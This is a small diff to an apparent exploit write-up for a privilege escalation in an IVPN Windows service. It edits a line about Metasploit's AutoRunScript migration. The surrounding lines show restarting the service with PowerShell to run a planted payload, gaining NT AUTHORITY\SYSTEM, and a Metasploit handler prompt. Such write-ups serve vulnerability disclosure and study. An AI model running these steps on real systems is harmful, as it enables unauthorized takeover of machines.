@@ -512,7 +512,8 @@ If the file is replaced, we can restart the service to execute the payload
 ```
 C:\Temp>powershell -c "Restart-Service -Name 'IVPN*' "
 ```
-If the service crash too fast and metasploit didn't finish migrate, run the command again or try with start instead of restart
+If the service crash too fast and theAutoRunScript in metasploit didn't finish migrate, run the command again or try with start instead of restart
+
 And now we have NT AUTHORITY\SYSTEM
 ```
 msf5 exploit(multi/handler) > run
